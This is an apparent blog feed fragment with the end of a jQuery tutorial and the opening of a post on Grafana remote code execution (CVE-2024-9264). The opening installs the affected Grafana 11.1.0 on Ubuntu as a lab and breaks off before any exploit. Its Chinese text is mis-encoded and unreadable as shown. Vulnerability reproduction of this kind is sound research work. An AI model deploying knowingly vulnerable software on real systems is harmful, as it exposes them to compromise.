function">log</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="6-ä¸°å¯Œçš„æ’ä»¶ç”Ÿæ€"><a href="#6-ä¸°å¯Œçš„æ’ä»¶ç”Ÿæ€" class="headerlink" title="6. ä¸°å¯Œçš„æ’ä»¶ç”Ÿæ€"></a>6. <strong>ä¸°å¯Œçš„æ’ä»¶ç”Ÿæ€</strong></h3><p>jQuery æ‹¥æœ‰å¤§é‡ç¬¬ä¸‰æ–¹æ’ä»¶ï¼Œå¯ä»¥æ‰©å±•å…¶åŠŸèƒ½ï¼Œæ»¡è¶³ç‰¹å®šéœ€æ±‚ã€‚</p><h3 id="7-é“¾å¼è°ƒç”¨"><a href="#7-é“¾å¼è°ƒç”¨" class="headerlink" title="7. é“¾å¼è°ƒç”¨"></a>7. <strong>é“¾å¼è°ƒç”¨</strong></h3><p>jQuery çš„é“¾å¼è°ƒç”¨ç‰¹æ€§å…è®¸åœ¨ä¸€æ¡è¯­å¥ä¸­è¿ç»­è°ƒç”¨å¤šä¸ªæ–¹æ³•ï¼Œä»è€Œä½¿ä»£ç æ›´åŠ ç®€æ´ï¼š</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#myElement"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addClass</span><span class="token punctuation">(</span><span class="token string">"highlight"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">fadeIn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token string">"æ›´æ–°å†…å®¹"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="8-è½»é‡çº§"><a href="#8-è½»é‡çº§" class="headerlink" title="8. è½»é‡çº§"></a>8. <strong>è½»é‡çº§</strong></h3><p>å°½ç®¡åŠŸèƒ½å¼ºå¤§ï¼ŒjQuery çš„æ ¸å¿ƒåº“å¤§å°è¾ƒå°ï¼ŒåŠ è½½é€Ÿåº¦å¿«ã€‚</p><h1 id="ä¸‰ã€ç¤ºä¾‹"><a href="#ä¸‰ã€ç¤ºä¾‹" class="headerlink" title="ä¸‰ã€ç¤ºä¾‹"></a>ä¸‰ã€ç¤ºä¾‹</h1><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token constant">DOCTYPE</span> html<span class="token operator">&gt;</span><span class="token operator">&lt;</span>html<span class="token operator">&gt;</span><span class="token operator">&lt;</span>head<span class="token operator">&gt;</span>    <span class="token operator">&lt;</span>script src<span class="token operator">=</span><span class="token string">"&lt;url id="</span><span class="token string">" type="</span>url<span class="token string">" status="</span><span class="token string">" title="</span><span class="token string">" wc="</span><span class="token string">"&gt;https://code.jquery.com/jquery-3.6.0.min.js"</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>url<span class="token operator">&gt;</span>     <span class="token operator">&lt;</span>script<span class="token operator">&gt;</span>        <span class="token function">$</span><span class="token punctuation">(</span>document<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">ready</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#toggleButton"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#message"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toggle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>head<span class="token operator">&gt;</span><span class="token operator">&lt;</span>body<span class="token operator">&gt;</span>    <span class="token operator">&lt;</span>button id<span class="token operator">=</span><span class="token string">"toggleButton"</span><span class="token operator">&gt;</span>åˆ‡æ¢æ˜¾ç¤º<span class="token operator">&lt;</span><span class="token operator">/</span>button<span class="token operator">&gt;</span>    <span class="token operator">&lt;</span>p id<span class="token operator">=</span><span class="token string">"message"</span><span class="token operator">&gt;</span>è¿™æ˜¯ä¸€ä¸ªå¯åˆ‡æ¢çš„æ®µè½ã€‚<span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>html<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>è¿™æ˜¯ä¸€ä¸ªå®Œæ•´ä¸”ç®€å•çš„ jQuery ç¤ºä¾‹ä»£ç ã€‚å®ƒå±•ç¤ºäº†å¦‚ä½•ä½¿ç”¨ jQuery å®ç°äº‹ä»¶å¤„ç†å’Œå…ƒç´ çš„æ˜¾ç¤º/éšè—æ•ˆæœã€‚</p><h3 id="åŠŸèƒ½è¯´æ˜"><a href="#åŠŸèƒ½è¯´æ˜" class="headerlink" title="åŠŸèƒ½è¯´æ˜"></a>åŠŸèƒ½è¯´æ˜</h3><ol><li><strong>åŠ è½½ jQuery</strong><br>åœ¨ <code>&lt;head&gt;</code> éƒ¨åˆ†é€šè¿‡ <code>&lt;script&gt;</code> æ ‡ç­¾åŠ è½½äº† jQuery çš„å®˜æ–¹åº“ï¼ˆç‰ˆæœ¬ 3.6.0ï¼‰ã€‚</li><li><strong>DOM å‡†å¤‡å°±ç»ªå¤„ç†</strong><br>ä½¿ç”¨ <code>$(document).ready()</code> ç¡®ä¿åœ¨ DOM åŠ è½½å®Œæˆåå†æ‰§è¡Œä»£ç ã€‚</li><li><strong>æŒ‰é’®ç‚¹å‡»äº‹ä»¶</strong><br>å½“ç”¨æˆ·ç‚¹å‡»æŒ‰é’®ï¼ˆID ä¸º <code>toggleButton</code>ï¼‰æ—¶ï¼Œä¼šè§¦å‘ç»‘å®šçš„äº‹ä»¶å¤„ç†å™¨ã€‚</li><li><strong>åˆ‡æ¢æ˜¾ç¤º/éšè—</strong><br><code>$("#message").toggle();</code> æ–¹æ³•ä¼šåœ¨æ¯æ¬¡ç‚¹å‡»æŒ‰é’®æ—¶åˆ‡æ¢æ®µè½ï¼ˆID ä¸º <code>message</code>ï¼‰çš„æ˜¾ç¤ºçŠ¶æ€ã€‚</li></ol><h3 id="è¿è¡Œæ•ˆæœ"><a href="#è¿è¡Œæ•ˆæœ" class="headerlink" title="è¿è¡Œæ•ˆæœ"></a>è¿è¡Œæ•ˆæœ</h3><p>åˆå§‹çŠ¶æ€ä¸‹ï¼Œé¡µé¢ä¸Šæ˜¾ç¤ºä¸€ä¸ªæŒ‰é’®å’Œä¸€æ®µæ–‡å­—ã€‚</p><p>ç‚¹å‡»æŒ‰é’®åï¼Œæ–‡å­—ä¼šæ¶ˆå¤±ã€‚</p><p>å†æ¬¡ç‚¹å‡»æŒ‰é’®ï¼Œæ–‡å­—é‡æ–°å‡ºç°ã€‚</p><h3 id="æ‰©å±•åŠŸèƒ½"><a href="#æ‰©å±•åŠŸèƒ½" class="headerlink" title="æ‰©å±•åŠŸèƒ½"></a>æ‰©å±•åŠŸèƒ½</h3><p>å¦‚æœä½ æƒ³å¢åŠ ä¸€äº›æ•ˆæœï¼Œæ¯”å¦‚ä½¿ç”¨åŠ¨ç”»ï¼Œå¯ä»¥æ›¿æ¢ <code>toggle</code> ä¸º <code>fadeToggle</code> æˆ– <code>slideToggle</code></p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#message"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">fadeToggle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// ä½¿ç”¨æ·¡å…¥æ·¡å‡ºæ•ˆæœåˆ‡æ¢</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote>]]></content>
      
      
      <categories>
          
          <category> å‰åç«¯å¼€å‘ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å‰ç«¯å¼€å‘ </tag>
            
            <tag> jQuery </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Grafanaè¡¨è¾¾å¼è¿œç¨‹ä»£ç æ‰§è¡Œ(CVE-2024-9264)</title>
      <link href="/2024/12/06/lou-dong-zhi-shi-ku/grafana-biao-da-shi-yuan-cheng-dai-ma-zhi-xing-cve-2024-9264/"/>
      <url>/2024/12/06/lou-dong-zhi-shi-ku/grafana-biao-da-shi-yuan-cheng-dai-ma-zhi-xing-cve-2024-9264/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸€ã€GrafanaåŸºç¡€"><a href="#ä¸€ã€GrafanaåŸºç¡€" class="headerlink" title="ä¸€ã€GrafanaåŸºç¡€"></a>ä¸€ã€GrafanaåŸºç¡€</h1><h2 id="1-1-Grafanaæ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#1-1-Grafanaæ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="1.1 Grafanaæ˜¯ä»€ä¹ˆï¼Ÿ"></a>1.1 Grafanaæ˜¯ä»€ä¹ˆï¼Ÿ</h2><p>Grafanaæ˜¯ä¸€æ¬¾å¼€æºçš„æ•°æ®å¯è§†åŒ–å’Œç›‘æ§å¹³å°ï¼Œå®ƒå…è®¸ç”¨æˆ·é€šè¿‡åˆ›å»ºåŠ¨æ€ä»ªè¡¨æ¿æ¥ç›‘è§†å’Œåˆ†ææ•°æ®ã€‚</p><p>ä»¥ä¸‹æ˜¯Grafanaçš„ä¸€äº›ä¸»è¦ç‰¹ç‚¹å’ŒåŠŸèƒ½ï¼š</p><ol><li><strong>å¤šæ•°æ®æºæ”¯æŒ</strong>ï¼šGrafanaæ”¯æŒå¤šç§æ•°æ®æºï¼ŒåŒ…æ‹¬ä½†ä¸é™äºGraphiteã€Prometheusã€Elasticsearchã€InfluxDBç­‰ï¼Œå¯ä»¥ä»å¤šç§æ•°æ®æºä¸­æ”¶é›†æ•°æ®ï¼Œå¹¶åœ¨åŒä¸€ä»ªè¡¨æ¿ä¸­è¿›è¡Œç»Ÿä¸€å±•ç¤ºã€‚</li><li><strong>ä¸°å¯Œçš„å¯è§†åŒ–é€‰é¡¹</strong>ï¼šæä¾›äº†å„ç§å›¾è¡¨ç±»å‹ã€æ ·å¼å’Œé…ç½®é€‰é¡¹ï¼Œç”¨æˆ·å¯ä»¥æ ¹æ®éœ€æ±‚å®šåˆ¶å›¾è¡¨ã€‚</li><li><strong>å‘Šè­¦åŠŸèƒ½</strong>ï¼šæ”¯æŒè®¾ç½®è­¦æŠ¥è§„åˆ™ï¼Œå¹¶åœ¨è¾¾åˆ°ç‰¹å®šæ¡ä»¶æ—¶å‘é€é€šçŸ¥ã€‚</li><li><strong>æ’ä»¶ç”Ÿæ€ç³»ç»Ÿ</strong>ï¼šæ‹¥æœ‰ä¸°å¯Œçš„æ’ä»¶ç”Ÿæ€ç³»ç»Ÿï¼Œç”¨æˆ·å¯ä»¥æ ¹æ®éœ€è¦æ‰©å±•å’Œå®šåˆ¶åŠŸèƒ½ã€‚</li><li><strong>ç¤¾åŒºæ”¯æŒ</strong>ï¼šæ‹¥æœ‰æ´»è·ƒçš„å¼€å‘ç¤¾åŒºï¼Œæä¾›äº†ä¸°å¯Œçš„æ–‡æ¡£ã€æ•™ç¨‹å’Œæ”¯æŒèµ„æºã€‚</li><li><strong>è·¨å¹³å°æ€§</strong>ï¼šGrafanaæ˜¯ä¸€ä¸ªè·¨å¹³å°çš„å¼€æºçš„åˆ†æå’Œå¯è§†åŒ–å·¥å…·ï¼Œå¯ä»¥é€šè¿‡å°†é‡‡é›†çš„æ•°æ®æŸ¥è¯¢ç„¶åå¯è§†åŒ–çš„å±•ç¤ºï¼Œå¹¶åŠæ—¶é€šçŸ¥ã€‚</li><li><strong>å›¾è¡¨ä¸å¯è§†åŒ–</strong>ï¼šGrafanaå…·æœ‰å¿«é€Ÿçµæ´»çš„å®¢æˆ·ç«¯å›¾è¡¨ï¼Œé¢æ¿æ’ä»¶æœ‰è®¸å¤šä¸åŒæ–¹å¼çš„å¯è§†åŒ–æŒ‡æ ‡å’Œæ—¥å¿—ï¼Œå®˜æ–¹åº“ä¸­å…·æœ‰ä¸°å¯Œçš„ä»ªè¡¨ç›˜æ’ä»¶ï¼Œæ¯”å¦‚çƒ­å›¾ã€æŠ˜çº¿å›¾ã€å›¾è¡¨ç­‰å¤šç§å±•ç¤ºæ–¹å¼ï¼Œè®©å¤æ‚çš„æ•°æ®å±•ç¤ºçš„ç¾è§‚è€Œä¼˜é›…ã€‚</li><li><strong>å®é™…åº”ç”¨åœºæ™¯å¹¿æ³›</strong>ï¼šGrafanaå¹¿æ³›åº”ç”¨äºITåŸºç¡€è®¾æ–½ç›‘æ§ã€ä¸šåŠ¡æ•°æ®åˆ†æä¸å¯è§†åŒ–ã€å®æ—¶æ•°æ®ä»ªè¡¨æ¿æ„å»ºç­‰é¢†åŸŸã€‚</li><li><strong>ç‰ˆæœ¬æ›´æ–°</strong>ï¼šGrafana 10.0ç‰ˆæœ¬åœ¨2023å¹´6æœˆå‘å¸ƒï¼Œå¸¦æ¥äº†è®¸å¤šæ–°åŠŸèƒ½å’Œæ”¹è¿›ï¼Œå¦‚æ›´æ–°çš„Panelé¢æ¿ã€Dashboardã€å¯¼èˆªæ ä»¥åŠGrafana Alteringç­‰ã€‚</li></ol><p>Grafanaä»¥å…¶å¼ºå¤§çš„åŠŸèƒ½å’Œçµæ´»æ€§ï¼Œæˆä¸ºäº†æ•°æ®å¯è§†åŒ–å’Œç›‘æ§é¢†åŸŸçš„é‡è¦å·¥å…·ï¼Œé€‚ç”¨äºå„ç§è§„æ¨¡çš„é¡¹ç›®å’Œä¸åŒçš„ç›‘æ§éœ€æ±‚ã€‚</p><h2 id="1-2-å®‰è£…éƒ¨ç½²ï¼ˆæœ¬åœ°éƒ¨ç½²ï¼‰"><a href="#1-2-å®‰è£…éƒ¨ç½²ï¼ˆæœ¬åœ°éƒ¨ç½²ï¼‰" class="headerlink" title="1.2 å®‰è£…éƒ¨ç½²ï¼ˆæœ¬åœ°éƒ¨ç½²ï¼‰"></a>1.2 å®‰è£…éƒ¨ç½²ï¼ˆæœ¬åœ°éƒ¨ç½²ï¼‰</h2><p>åœ¨Ubuntuä¸Šå®‰è£…æŒ‡å®šç‰ˆæœ¬çš„Grafanaï¼Œä½ å¯ä»¥æŒ‰ç…§ä»¥ä¸‹æ­¥éª¤æ“ä½œï¼š</p><p>ä¸‹é¢æ˜¯æˆ‘æ‰€ä½¿ç”¨çš„ubuntuç³»ç»Ÿä¿¡æ¯</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Ubuntu <span class="token number">22.04</span>.3 LTS<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/06/lou-dong-zhi-shi-ku/grafana-biao-da-shi-yuan-cheng-dai-ma-zhi-xing-cve-2024-9264/%E6%88%AA%E5%B1%8F2024-12-09%2014.00.27.png" alt="ç³»ç»Ÿä¿¡æ¯" style="zoom:40%;"><h3 id="1-2-1-æ›´æ–°ç³»ç»Ÿè½¯ä»¶åŒ…"><a href="#1-2-1-æ›´æ–°ç³»ç»Ÿè½¯ä»¶åŒ…" class="headerlink" title="1.2.1 æ›´æ–°ç³»ç»Ÿè½¯ä»¶åŒ…"></a>1.2.1 <strong>æ›´æ–°ç³»ç»Ÿè½¯ä»¶åŒ…</strong></h3><p>æ›´æ–°ä½ çš„Ubuntuç³»ç»Ÿä»¥ç¡®ä¿æ‰€æœ‰è½¯ä»¶åŒ…å’Œä¾èµ–é¡¹æ˜¯æœ€æ–°çš„ã€‚</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">sudo apt updatesudo apt upgrade<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>å‘½ä»¤è¯¦è§£ï¼š</p><p><code>sudo apt update</code> å’Œ <code>sudo apt upgrade</code> æ˜¯åœ¨åŸºäº Debian çš„ Linux å‘è¡Œç‰ˆï¼ˆå¦‚ Ubuntuï¼‰ä¸­ä½¿ç”¨çš„å‘½ä»¤ï¼Œå®ƒä»¬ç”¨äºç®¡ç†å’Œæ›´æ–°ç³»ç»Ÿè½¯ä»¶åŒ…ã€‚ä¸‹é¢æ˜¯è¿™ä¸¤ä¸ªå‘½ä»¤çš„è¯¦ç»†è§£é‡Šï¼š</p><h3 id="sudo-apt-update"><a href="#sudo-apt-update" class="headerlink" title="sudo apt update"></a>sudo apt update</h3><ul><li><code>sudo</code>ï¼šè¿™æ˜¯ä¸€ä¸ªå‘½ä»¤è¡Œå®ç”¨ç¨‹åºï¼Œå…è®¸æˆæƒçš„ç”¨æˆ·ä»¥å¦ä¸€ä¸ªç”¨æˆ·çš„å®‰å…¨æƒé™æ‰§è¡Œå‘½ä»¤ï¼Œé»˜è®¤æƒ…å†µä¸‹æ˜¯ä»¥è¶…çº§ç”¨æˆ·ï¼ˆrootï¼‰çš„æƒé™æ‰§è¡Œã€‚</li><li><code>apt</code>ï¼šæ˜¯â€œAdvanced Package Toolâ€çš„ç¼©å†™ï¼Œå®ƒæ˜¯ Debian åŠå…¶è¡ç”Ÿç‰ˆï¼ˆå¦‚ Ubuntuï¼‰çš„è½¯ä»¶åŒ…ç®¡ç†å·¥å…·ã€‚</li><li><code>update</code>ï¼šè¿™æ˜¯ <code>apt</code> å·¥å…·çš„ä¸€ä¸ªå‘½ä»¤ï¼Œç”¨äºä»æºæœåŠ¡å™¨åŒæ­¥è½¯ä»¶åŒ…ç´¢å¼•æ–‡ä»¶ã€‚è¿™ä¸ªå‘½ä»¤ä¸ä¼šæ›´æ”¹ä»»ä½•å·²å®‰è£…çš„è½¯ä»¶åŒ…ï¼Œå®ƒåªæ˜¯æ›´æ–°æœ¬åœ°æ•°æ®åº“ï¼Œä½¿å…¶ä¸è½¯ä»¶æºä¸­çš„æœ€æ–°è½¯ä»¶åŒ…ä¿¡æ¯ä¿æŒä¸€è‡´ã€‚</li></ul><p>æ‰§è¡Œ <code>sudo apt update</code> æ—¶ï¼Œç³»ç»Ÿä¼šä»æ¯ä¸ªå¯ç”¨çš„è½¯ä»¶æºï¼ˆåœ¨ <code>/etc/apt/sources.list</code> å’Œ <code>/etc/apt/sources.list.d/</code> ä¸‹çš„æ–‡ä»¶ä¸­å®šä¹‰ï¼‰è·å–æœ€æ–°çš„è½¯ä»¶åŒ…åˆ—è¡¨ã€‚è¿™ä¸ªæ“ä½œæ˜¯å®‰è£…ã€å‡çº§æˆ–ç§»é™¤è½¯ä»¶åŒ…ä¹‹å‰çš„é‡è¦æ­¥éª¤ï¼Œå› ä¸ºå®ƒç¡®ä¿äº†ä½ æ‹¥æœ‰æœ€æ–°çš„è½¯ä»¶åŒ…ä¿¡æ¯ã€‚</p><h3 id="sudo-apt-upgrade"><a href="#sudo-apt-upgrade" class="headerlink" title="sudo apt upgrade"></a>sudo apt upgrade</h3><ul><li><code>upgrade</code>ï¼šè¿™æ˜¯ <code>apt</code> çš„å¦ä¸€ä¸ªå‘½ä»¤ï¼Œç”¨äºå‡çº§æ‰€æœ‰å¯å‡çº§çš„è½¯ä»¶åŒ…è‡³æœ€æ–°ç‰ˆæœ¬ã€‚</li></ul><p>æ‰§è¡Œ <code>sudo apt upgrade</code> æ—¶ï¼Œç³»ç»Ÿä¼šæŸ¥æ‰¾æ‰€æœ‰å·²å®‰è£…çš„è½¯ä»¶åŒ…ï¼Œå¦‚æœæœ‰å¯ç”¨çš„æ›´æ–°ï¼ˆè¿™äº›ä¿¡æ¯æ˜¯é€šè¿‡ <code>sudo apt update</code> è·å¾—çš„ï¼‰ï¼Œåˆ™å°†å®ƒä»¬å‡çº§åˆ°æœ€æ–°ç‰ˆæœ¬ã€‚è¿™ä¸ªå‘½ä»¤ä¼šå¤„ç†ä¾èµ–å…³ç³»ï¼Œç¡®ä¿åœ¨å‡çº§è¿‡ç¨‹ä¸­æ‰€éœ€çš„ä¾èµ–é¡¹ä¹Ÿä¼šè¢«å®‰è£…æˆ–å‡çº§ã€‚</p></blockquote><h3 id="1-2-2-è®¿é—®å®˜ç½‘"><a href="#1-2-2-è®¿é—®å®˜ç½‘" class="headerlink" title="1.2.2 è®¿é—®å®˜ç½‘"></a>1.2.2 è®¿é—®å®˜ç½‘</h3><p><a href="https://grafana.com/grafana/download/11.1.0?pg=get&amp;plcmt=selfmanaged-box1-cta1">https://grafana.com/grafana/download/11.1.0?pg=get&amp;plcmt=selfmanaged-box1-cta1</a></p><img src="/2024/12/06/lou-dong-zhi-shi-ku/grafana-biao-da-shi-yuan-cheng-dai-ma-zhi-xing-cve-2024-9264/%E6%88%AA%E5%B1%8F2024-12-09%2013.30.28.png" alt="grafanaå®˜ç½‘" style="zoom:50%;"><p>ã€é€‰æ‹©ç‰¹å®šçš„ç‰ˆæœ¬ï¼ŒCVE-2024-9264è¢«è¯„ä¸º9.9çš„CVSSè¯„åˆ†ï¼Œå½±å“Grafana 11.0.xã€11.1.xå’Œ11.2.xç‰ˆæœ¬ã€‚ã€‘</p><p>è¿™é‡Œæˆ‘é€‰æ‹©çš„æ˜¯11.1.0ç‰ˆæœ¬çš„ï¼Œåç»­æŒ‰ç…§å®˜æ–¹æç¤ºæ“ä½œå³å¯ã€‚</p><h3 id="1-2-3-å®‰è£…grafana"><a href="#1-2-3-å®‰è£…grafana" class="headerlink" title="1.2.3 å®‰è£…grafana"></a>1.2.3 å®‰è£…grafana</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> <span class="token parameter variable">-y</span> adduser libfontconfig1 musl<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><ul><li>bugå¤„ç†</li></ul><img src="/2024/12/06/lou-dong-zhi-shi-ku/grafana-biao-da-shi-yuan-cheng-dai-ma-zhi-xing-cve-2024-9264/%E6%88%AA%E5%B1%8F2024-12-09%2013.34.52.png" alt="bug" style="zoom:50%;"><p>é”™è¯¯è§£é‡Šï¼š</p><ul><li><code>E: Could not get lock /var/lib/dpkg/lock-frontend. It is held by process 27625 (unattended-upgr)</code>ï¼šè¿™ä¸ªé”™è¯¯è¡¨æ˜ <code>apt-get</code> æ— æ³•è·å– <code>/var/lib/dpkg/lock-frontend</code> è¿™ä¸ªé”æ–‡ä»¶ï¼Œå› ä¸ºå®ƒæ­£è¢«è¿›ç¨‹å·ä¸º 27625 çš„è¿›ç¨‹ï¼ˆ<code>unattended-upgr</code>ï¼Œå³æ— äººå€¼å®ˆå‡çº§è¿›ç¨‹ï¼‰å ç”¨ã€‚</li><li><code>N: Be aware that removing the lock file is not a solution and may break your system.</code>ï¼šè¿™æ˜¯ä¸€ä¸ªè­¦å‘Šï¼Œæé†’ç”¨æˆ·ä¸è¦ç®€å•åœ°åˆ é™¤é”æ–‡ä»¶ï¼Œå› ä¸ºè¿™å¯èƒ½ä¼šç ´åç³»ç»Ÿã€‚</li><li><code>E: Unable to acquire the dpkg frontend lock (/var/lib/dpkg/lock-frontend), is another process using it?</code>ï¼šè¿™ä¸ªé”™è¯¯å†æ¬¡å¼ºè°ƒæ— æ³•è·å– dpkg å‰ç«¯é”ï¼Œè¯¢é—®æ˜¯å¦æœ‰å…¶ä»–è¿›ç¨‹æ­£åœ¨ä½¿ç”¨å®ƒã€‚</li></ul><p>è¿™ä¸ªé”™è¯¯é€šå¸¸å‘ç”Ÿåœ¨ç³»ç»Ÿæ­£åœ¨è¿›è¡Œå¦ä¸€ä¸ªè½¯ä»¶åŒ…ç®¡ç†æ“ä½œï¼Œæ¯”å¦‚å¦ä¸€ä¸ª <code>apt-get</code> å‘½ä»¤æˆ–è€…ç³»ç»Ÿæ›´æ–°æ­£åœ¨è¿è¡Œã€‚è§£å†³è¿™ä¸ªé—®é¢˜çš„æ–¹æ³•é€šå¸¸æ˜¯ç­‰å¾…å½“å‰çš„è½¯ä»¶åŒ…ç®¡ç†æ“ä½œå®Œæˆï¼Œæˆ–è€…å¦‚æœç¡®å®šæ²¡æœ‰å…¶ä»–æ“ä½œåœ¨è¿›è¡Œï¼Œå¯ä»¥æ£€æŸ¥æ˜¯å¦æœ‰åƒµå°¸è¿›ç¨‹å ç”¨äº†é”æ–‡ä»¶ã€‚</p><p>å¦‚æœéœ€è¦å¼ºåˆ¶ç»ˆæ­¢å ç”¨é”æ–‡ä»¶çš„è¿›ç¨‹ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼ˆè¯·è°¨æ…ä½¿ç”¨ï¼Œå› ä¸ºè¿™å¯èƒ½ä¼šå¯¼è‡´ç³»ç»Ÿä¸ç¨³å®šï¼‰ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">kill</span> <span class="token parameter variable">-9</span> <span class="token number">27625</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç„¶åå†æ¬¡å°è¯•è¿è¡Œä½ çš„ <code>apt-get</code> å‘½ä»¤ã€‚å¦‚æœä½ ä¸ç¡®å®šï¼Œæœ€å¥½å…ˆæ£€æŸ¥ç³»ç»Ÿæ˜¯å¦æœ‰æ­£åœ¨è¿è¡Œçš„æ›´æ–°æˆ–è½¯ä»¶åŒ…ç®¡ç†æ“ä½œã€‚</p></blockquote><img src="/2024/12/06/lou-dong-zhi-shi-ku/grafana-biao-da-shi-yuan-cheng-dai-ma-zhi-xing-cve-2024-9264/%E6%88%AA%E5%B1%8F2024-12-09%2013.38.52-3722748.png" alt="ä¾èµ–å®‰è£…" style="zoom:50%;"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> https://dl.grafana.com/enterprise/release/grafana-enterprise_11.1.0_amd64.deb<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/06/lou-dong-zhi-shi-ku/grafana-biao-da-shi-yuan-cheng-dai-ma-zhi-xing-cve-2024-9264/%E6%88%AA%E5%B1%8F2024-12-09%2013.47.36.png" style="zoom:50%;"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> dpkg <span class="token parameter variable">-i</span> grafana-enterprise_11.1.0_amd64.deb<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><ul><li><code>dpkg</code>ï¼šæ˜¯ Debian åŒ…ç®¡ç†å™¨çš„å‘½ä»¤è¡Œå·¥å…·ï¼Œç”¨äºå®‰è£…ã€æ„å»ºã€æ‹†é™¤å’Œæ£€æŸ¥ Debian è½¯ä»¶åŒ…ã€‚</li><li><code>-i</code>ï¼šè¿™æ˜¯ <code>dpkg</code> å‘½ä»¤çš„ä¸€ä¸ªé€‰é¡¹ï¼Œä»£è¡¨ <code>--install</code>ï¼Œç”¨äºå®‰è£…æœ¬åœ°çš„ Debian è½¯ä»¶åŒ…ã€‚</li></ul></blockquote><img src="/2024/12/06/lou-dong-zhi-shi-ku/grafana-biao-da-shi-yuan-cheng-dai-ma-zhi-xing-cve-2024-9264/%E6%88%AA%E5%B1%8F2024-12-09%2013.51.52.png" alt="æˆªå±2024-12-09 13.51.52" style="zoom:50%;"><h3 id="1-2-4-å¯åŠ¨æœåŠ¡"><a href="#1-2-4-å¯åŠ¨æœåŠ¡" class="headerlink" title="1.2.4 å¯åŠ¨æœåŠ¡"></a>1.2.4 å¯åŠ¨æœåŠ¡</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> /bin/systemctl start grafana-serveræˆ–systemctl start grafana-server<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="1-2-5-æŸ¥çœ‹å¯åŠ¨çŠ¶æ€"><a href="#1-2-5-æŸ¥çœ‹å¯åŠ¨çŠ¶æ€" class="headerlink" title="1.2.5 æŸ¥çœ‹å¯åŠ¨çŠ¶æ€"></a>1.2.5 æŸ¥çœ‹å¯åŠ¨çŠ¶æ€</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> /bin/systemctl status grafana-serveræˆ–systemctl status grafana-server<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><img src="/2024/12/06/lou-dong-zhi-shi-ku/grafana-biao-da-shi-yuan-cheng-dai-ma-zhi-xing-cve-2024-9264/%E6%88%AA%E5%B1%8F2024-12-09%2013.55.03.png" alt="æˆªå±2024-12-09 13.55.03" style="zoom:50%;"><h3 id="1-2-6-è®¿é—®æœåŠ¡"><a href="#1-2-6-è®¿é—®æœåŠ¡" class="headerlink" title="1.2.6 è®¿é—®æœåŠ¡"></a>1.2.6 